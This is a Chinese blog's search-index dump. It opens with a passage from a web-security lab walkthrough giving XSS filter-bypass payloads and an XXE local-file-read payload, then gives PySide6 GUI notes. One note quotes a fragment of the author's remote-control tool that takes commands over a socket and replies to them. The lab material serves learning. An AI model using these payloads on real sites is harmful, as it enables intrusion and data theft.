class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>发现没有反应，查看一下提示让我们登录后台，并且给了密码，登录进去发现出现了弹窗，通关</p>\n<p>其实这一关的原理就是存储型xss，输入的时候不会有反应，但是在后台会显示出来，造成了xss注入</p>\n<p>因此存储型xss的主要场景就是那种在线编辑器和评论系统一类的</p>\n<h2 id=\"XSS过滤\"><a href=\"#XSS过滤\" class=\"headerlink\" title=\"XSS过滤\"></a>XSS过滤</h2><p>这一关终于过滤了，输出我们的payload之后只剩下了一个尖括号，尝试换一个语句，前面dvwa用的是img src这里就用a href语句吧</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">javascript:alert()</span>&gt;</span>xxx<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>发现也被过滤了，可能是后端吧javascript的script过滤了，只能使用img src了</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">114514</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>成功通关</p>\n<h2 id=\"XSS-Htmlspecialchars过滤\"><a href=\"#XSS-Htmlspecialchars过滤\" class=\"headerlink\" title=\"XSS Htmlspecialchars过滤\"></a>XSS Htmlspecialchars过滤</h2><p>这个绕过方式就是通过事件来绕过，我们随便输入一点东西来看看页面源代码</p>\n<p>欸等等。。。这似乎是href注入啊？？</p>\n\n\n<p>看了一下源码</p>\n\n\n<p>确实有过滤，那我们就按照他的来，构造onfocus事件来绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; onfocus=javascript:alert() &#x27;<br></code></pre></td></tr></table></figure>\n\n<p>成功</p>\n<h2 id=\"XSS-href输出\"><a href=\"#XSS-href输出\" class=\"headerlink\" title=\"XSS href输出\"></a>XSS href输出</h2><p>和上面一关的payload其实可以用一样的：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">javascript:alert()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"XSS-js输出\"><a href=\"#XSS-js输出\" class=\"headerlink\" title=\"XSS js输出\"></a>XSS js输出</h2><p>查看页面源代码：</p>\n\n\n<p>这里只需要闭合一下就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>带入原来的源代码看一看：</p>\n\n\n<p>后面的那个<code>&lt;/script&gt;</code>出现了语法错误，但是这无伤大雅，并不影响运行！</p>\n<h1 id=\"XXE注入漏洞\"><a href=\"#XXE注入漏洞\" class=\"headerlink\" title=\"XXE注入漏洞\"></a>XXE注入漏洞</h1><p>界面提示：<code>这是一个接收xml数据的api</code></p>\n<p>尝试在登录框输入一段xml：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">aaaa</span>&gt;</span>abcdtest<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">aaaa</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>看界面回显出来了<code>abcdtest</code>但是没有回显标签，证明存在xxe漏洞，并且是一个有回显的</p>\n<p>我们将xxe漏洞的payload复制上去，让他读取一个文件：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">ANY</span> [<span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">xxe</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///D://Desktop//1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">x</span>&gt;</span><span class=\"hljs-symbol\">&amp;xxe;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">x</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>这样界面就回显出来了文件中的内容</p>\n<p>ok，这个漏洞完美结束！</p>\n","categories":["Web"],"tags":["xss","sql","file_upload","file_inclusion"]},{"title":"PySide6学习笔记#1","url":"/2023/04/23/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/","content":"<h1 id=\"0-前言\"><a href=\"#0-前言\" class=\"headerlink\" title=\"0 前言\"></a>0 前言</h1><p>如果你想要学习pyside6的话，</p>\n<p>建议有python基础的再来学</p>\n<ol>\n<li><p>基本if判断</p>\n</li>\n<li><p>类</p>\n</li>\n<li><p>函数</p>\n</li>\n</ol>\n<p>我的随课笔记来源于：</p>\n<p><a href=\"https://www.bilibili.com/video/BV1c84y1N7iL\">https://www.bilibili.com/video/BV1c84y1N7iL</a></p>\n<h1 id=\"1-环境搭建\"><a href=\"#1-环境搭建\" class=\"headerlink\" title=\"1 环境搭建\"></a>1 环境搭建</h1><p>首先python环境这个不用我讲了吧</p>\n<p>然后，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install pyside6<br></code></pre></td></tr></table></figure>\n\n<p>你会在python环境的Lib&#x2F;site-packages&#x2F;PySide6目录下看到一些exe</p>\n\n\n<p>把我标出来的这些exe点开看看，</p>\n<p>可以正常运行代表环境配置成功！</p>\n<p>我的编辑器是Pycharm</p>\n<h1 id=\"基础框架\"><a href=\"#基础框架\" class=\"headerlink\" title=\"基础框架\"></a>基础框架</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow    <span class=\"hljs-comment\"># 导入模块</span><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):      <br>        <span class=\"hljs-built_in\">super</span>().__init__()    <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:    <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])    <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()       <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()             <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"控件\"><a href=\"#控件\" class=\"headerlink\" title=\"控件\"></a>控件</h1><h2 id=\"QPushButton\"><a href=\"#QPushButton\" class=\"headerlink\" title=\"QPushButton\"></a>QPushButton</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QPushButton<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()    <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        button = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>, self)   <br>                              <span class=\"hljs-comment\"># 创建一个按钮对象 并绑定到这个mainwindow</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:    <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])    <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()       <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()             <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>每个控件都有属性，</p>\n<p>如何直观的看到属性呢？</p>\n<p>就是在前面说的qt designer里面</p>\n<p>里面的Widgets有很多属性，</p>\n<p>只需要自己修改一下就知道这个属性是干嘛用的了</p>\n\n\n<p>那如何在代码里面修改属性呢？</p>\n<p>就是视频里面说的:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QPushButton<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()    <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        button = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>, self)<br>        button.setGeometry(<span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">100</span>)   <span class=\"hljs-comment\"># 设置属性</span><br>        button.setToolTip(<span class=\"hljs-string\">&#x27;Tooltip&#x27;</span>)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:    <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])    <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()       <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()             <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>其他的属性可以自己修改</p>\n<h2 id=\"QLable\"><a href=\"#QLable\" class=\"headerlink\" title=\"QLable\"></a>QLable</h2><p>举一反三下，</p>\n<p>打开qt designer，</p>\n<p>自己修改属性</p>\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QLabel<br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()    <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        lb = QLabel(<span class=\"hljs-string\">&#x27;标签&#x27;</span>, self)    <span class=\"hljs-comment\"># 设置属性</span><br>        lb.setFont(<span class=\"hljs-string\">&#x27;Palatino Linotype&#x27;</span>)   <br>        lb.setGeometry(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">100</span>)<br>        lb.setToolTip(<span class=\"hljs-string\">&#x27;看到这个标签代表你成功了&#x27;</span>)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:    <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])    <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()       <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()             <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>ok成功</p>\n<p>接下来视频里面讲到了如何修改一些特殊的属性</p>\n<p>例如我要修改他的text format</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QLabel<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()    <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        lb = QLabel(<span class=\"hljs-string\">&#x27;**标签**&#x27;</span>, self)<br>        lb.setFont(<span class=\"hljs-string\">&#x27;Palatino Linotype&#x27;</span>)<br>        lb.setGeometry(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">100</span>)<br>        lb.setToolTip(<span class=\"hljs-string\">&#x27;看到这个标签代表你成功了&#x27;</span>)<br>        lb.setTextFormat(Qt.TextFormat.MarkdownText)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:    <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])    <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()       <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()             <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>然后我们将前面的“标签”使用md语法</p>\n<p>添加两个星号，如果文字是这样：</p>\n<p><strong>标签</strong></p>\n<p>就代表你成功了！</p>\n<h2 id=\"QLineEdit\"><a href=\"#QLineEdit\" class=\"headerlink\" title=\"QLineEdit\"></a>QLineEdit</h2><p>同样自己试试举一反三</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QLineEdit<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()    <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        line = QLineEdit(self)<br>        line.setReadOnly(<span class=\"hljs-literal\">True</span>)<br>        line.setGeometry(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">300</span>, <span class=\"hljs-number\">50</span>)<br>        line.setPlaceholderText(<span class=\"hljs-string\">&#x27;Enter something~&#x27;</span>)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:    <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])    <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()       <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()             <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"窗体类型\"><a href=\"#窗体类型\" class=\"headerlink\" title=\"窗体类型\"></a>窗体类型</h2><p>这个没什么好说的，直接去听课吧</p>\n<p><a href=\"https://www.bilibili.com/video/BV1c84y1N7iL?p=5&spm_id_from=pageDriver&vd_source=1c43bcf31e4abf33f3960dd414786c92\">04.5 三种窗体介绍(可回头再来听)_哔哩哔哩_bilibili</a></p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><ol>\n<li>QPushButton(self,’文字’)</li>\n<li>QLable(self,’文字’)</li>\n<li>QLineEdit(self)</li>\n</ol>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#10","url":"/2023/05/01/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10/","content":"<p>今天讲MessageBox，</p>\n<p>并且我来扩展3种其他的弹窗方式</p>\n<span id=\"more\"></span>\n\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QMessageBox<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-comment\">#           ↓ 设置图标                             # ↓ 设置按钮 可以无限增加                                           # 默认</span><br>        QMessageBox.information(self, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, QMessageBox.StandardButton.Cancel | QMessageBox.StandardButton.Ok, QMessageBox.StandardButton.Ok)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>这个太简单了，</p>\n<p>但是这个控件在编译的时候可能会增加很大的体积，</p>\n<p>接下来我拓展几种</p>\n<p>（问就是之前搞远控的时候研究的</p>\n<h1 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h1><h2 id=\"1-easygui\"><a href=\"#1-easygui\" class=\"headerlink\" title=\"1 easygui\"></a>1 easygui</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install easygui<br></code></pre></td></tr></table></figure>\n\n<p>这个是最简单的一行代码搞定的那种，</p>\n<p>但是不推荐用，</p>\n<p>因为打包出来还是很大，</p>\n<p>（这个库有很多封装好的功能，</p>\n<p>（适合小小白</p>\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> easygui<br><br>easygui.msgbox(<span class=\"hljs-string\">&#x27;msg&#x27;</span>, <span class=\"hljs-string\">&#x27;title&#x27;</span>, ok_button=<span class=\"hljs-string\">&#x27;我知道了&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-win32api\"><a href=\"#2-win32api\" class=\"headerlink\" title=\"2 win32api\"></a>2 win32api</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install pywin32<br></code></pre></td></tr></table></figure>\n\n<p>这个和前面的QMessageBox很像，</p>\n<p>同样可以设置图标</p>\n\n\n<p>这个其实就涉及到win32api的调用了</p>\n<p>可以看microsoft给出的文档</p>\n<p><a href=\"https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-messagebox\">MessageBox 函数</a></p>\n<p>或者可以看我之前远控远古版本的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">msg</span>(<span class=\"hljs-params\">msg=<span class=\"hljs-string\">&#x27;&#x27;</span>, title=<span class=\"hljs-string\">&#x27;&#x27;</span>, icon=<span class=\"hljs-string\">&#x27;&#x27;</span></span>):<br>    <span class=\"hljs-keyword\">try</span>:<br>        icon = do.split(<span class=\"hljs-string\">&#x27;=&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;-&#x27;</span>)[<span class=\"hljs-number\">2</span>]<br>        <span class=\"hljs-keyword\">if</span> icon == <span class=\"hljs-string\">&#x27;warning&#x27;</span>:<br>            ico = win32con.MB_ICONWARNING<br><br>        <span class=\"hljs-keyword\">elif</span> icon == <span class=\"hljs-string\">&#x27;info&#x27;</span>:<br>            ico = win32con.MB_ICONINFORMATION<br><br>        <span class=\"hljs-keyword\">elif</span> icon == <span class=\"hljs-string\">&#x27;question&#x27;</span>:<br>            ico = win32con.MB_ICONQUESTION<br><br>        <span class=\"hljs-keyword\">elif</span> icon == <span class=\"hljs-string\">&#x27;error&#x27;</span>:<br>            ico = win32con.MB_ICONHAND<br><br>        <span class=\"hljs-keyword\">else</span>:<br>            ico = win32con.MB_ICONMASK<br><br>        ct.send(<span class=\"hljs-built_in\">bytes</span>(<span class=\"hljs-string\">&#x27;[*]ok&#x27;</span>.encode(<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>)))<br>        win32api.MessageBox(<span class=\"hljs-number\">0</span>, do.split(<span class=\"hljs-string\">&#x27;=&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;-&#x27;</span>)[<span class=\"hljs-number\">0</span>],<br>                            do.split(<span class=\"hljs-string\">&#x27;=&#x27;</span>)[<span class=\"hljs-number\">1</span>].split(<span class=\"hljs-string\">&#x27;-&#x27;</span>)[<span class=\"hljs-number\">1</span>], ico)<br><br><br>    <span class=\"hljs-keyword\">except</span>:<br>        ct.send(<span class=\"hljs-built_in\">bytes</span>(<span class=\"hljs-string\">&#x27;[-]弹窗执行失败&#x27;</span>.encode(<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>)))<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-Ctypes\"><a href=\"#3-Ctypes\" class=\"headerlink\" title=\"3 Ctypes\"></a>3 Ctypes</h1><p>这个是专门调用win32api的，</p>\n<p>和前面的那个对比一下：</p>\n\n\n<p>体积小了《不少》</p>\n<p>（远控里面反正体积越小越好</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> ctypes<br><br>a = ctypes.windll.LoadLibrary(<span class=\"hljs-string\">&#x27;user32.dll&#x27;</span>)<br>a.MessageBoxW(<span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n\n\n<p>这个就是调用user32这个dll里面封装的内置函数，</p>\n<p>可以去下载一个易语言的api伴侣</p>\n\n\n<p>注：</p>\n<p><strong>这里千万不要用MessageBoxA，</strong></p>\n<p><strong>要MessageBoxW！</strong></p>\n<p>之前搞远控的时候因为这个坑浪费了好长时间</p>\n<p>那这个如何设置图标呢？</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> ctypes<br><br>a = ctypes.windll.LoadLibrary(<span class=\"hljs-string\">&#x27;user32.dll&#x27;</span>)<br>a.MessageBoxW(<span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-number\">0</span>+<span class=\"hljs-number\">16</span>)<br></code></pre></td></tr></table></figure>\n\n<p>只需要在最后参数里面加个数字就和前面<strong>2</strong>介绍的效果一样了，</p>\n<p>图标也是error</p>\n<p>然后我整理了一下常用的图标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">warning 48<br>info 64<br>question 32<br>error 16<br></code></pre></td></tr></table></figure>\n\n<p>然后按钮样式就是把”0+16”里面的那个0换掉就可以了，</p>\n<p>具体的数字可以自己去试</p>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#11","url":"/2023/05/02/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-11/","content":"<p>今天学习两个控件:</p>\n<p>QInputDialog QFileDialog</p>\n<span id=\"more\"></span>\n\n<h1 id=\"QInputDialog\"><a href=\"#QInputDialog\" class=\"headerlink\" title=\"QInputDialog\"></a>QInputDialog</h1><p>这个用来做交互式页面时绝对必不可少的东西</p>\n<p>先直接上代码吧，</p>\n<p>毕竟这种控件还是不是很难的</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QInputDialog, QVBoxLayout, QPushButton<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.mainLayout = QVBoxLayout()<br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>)<br>        btn.clicked.connect(self.bind)<br>        self.mainLayout.addWidget(btn)<br>        self.setLayout(self.mainLayout)<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-comment\"># 第一个参数永远是self 后面的依次是： title msg (默认button是ok cancel)</span><br>        <span class=\"hljs-comment\">#                                后面的int参数分别是     初始 最小 最大 步长</span><br>        inputDialog = QInputDialog.getInt(self, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, <span class=\"hljs-number\">1</span>, -<span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">50</span>, <span class=\"hljs-number\">2</span>)<br>        <span class=\"hljs-built_in\">print</span>(inputDialog)<br>        inputDialog2 = QInputDialog.getItem(self, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, [<span class=\"hljs-string\">&#x27;a&#x27;</span>, <span class=\"hljs-string\">&#x27;b&#x27;</span>, <span class=\"hljs-string\">&#x27;c&#x27;</span>, <span class=\"hljs-string\">&#x27;d&#x27;</span>], editable=<span class=\"hljs-literal\">False</span>)<br>        <span class=\"hljs-built_in\">print</span>(inputDialog2)<br>        inputDialog3 = QInputDialog.getText(self, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>)<br>        <span class=\"hljs-built_in\">print</span>(inputDialog3)<br>        inputDialog4 = QInputDialog.getMultiLineText(self, <span class=\"hljs-string\">&#x27;tutle&#x27;</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, <span class=\"hljs-string\">&#x27;default content&#x27;</span>)<br>        <span class=\"hljs-built_in\">print</span>(inputDialog4)<br>        <span class=\"hljs-comment\"># 他的参数和上面的那个一样</span><br>        inputDialog5 = QInputDialog.getDouble(self, <span class=\"hljs-string\">&#x27;title&#x27;</span>, <span class=\"hljs-string\">&#x27;msg&#x27;</span>, <span class=\"hljs-number\">1</span>, -<span class=\"hljs-number\">114514</span>, <span class=\"hljs-number\">114514</span>, <span class=\"hljs-number\">666</span>)<br>        <span class=\"hljs-built_in\">print</span>(inputDialog5)<br><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>如果你不知道需要填什么参数，</p>\n<p>你在输入一个逗号之后你的编辑器一般都会给你弹出提示</p>\n\n\n<p>ok了通关下一个</p>\n<h1 id=\"QFileDialog\"><a href=\"#QFileDialog\" class=\"headerlink\" title=\"QFileDialog\"></a>QFileDialog</h1><p>静态方法如下：</p>\n\n\n<p>然后常用的有</p>\n\n\n<h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QFileDialog, QPushButton, QVBoxLayout<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.mainLayout = QVBoxLayout()<br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>)<br>        self.mainLayout.addWidget(btn)<br>        self.setLayout(self.mainLayout)<br>        